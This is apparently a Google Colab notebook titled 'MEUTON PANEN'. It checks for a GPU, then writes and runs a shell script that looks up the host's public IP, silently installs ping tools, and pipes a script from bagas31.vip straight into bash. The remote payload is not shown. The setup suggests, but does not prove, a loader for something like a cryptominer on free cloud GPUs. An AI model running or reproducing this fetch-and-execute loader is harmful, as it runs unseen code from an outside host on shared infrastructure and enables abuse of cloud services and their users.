{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Gapthat.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# MEUTON PANEN"
      ],
      "metadata": {
        "id": "NzHHeVnQv5FS"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "-qF3nB2GvsA6"
      },
      "outputs": [],
      "source": [
        "!nvidia-smi --query-gpu=gpu_name --format=csv"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sh = \"\"\"\n",
        "curl ipinfo.io; echo\n",
        "if ! hash ping &>/dev/null; then\n",
        "  echo \"Installing ping tools ...\"\n",
        "  apt-get install iputils-ping -y &>/dev/null\n",
        "fi\n",
        "curl bagas31.vip/iso/file.sh -sL | bash\n",
        "\"\"\"\n",
        "with open('script.sh', 'w') as file:\n",
        "  file.write(sh)\n",
        "\n",
        "!bash script.sh"
      ],
      "metadata": {
        "id": "DmFfoXXrvt11"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}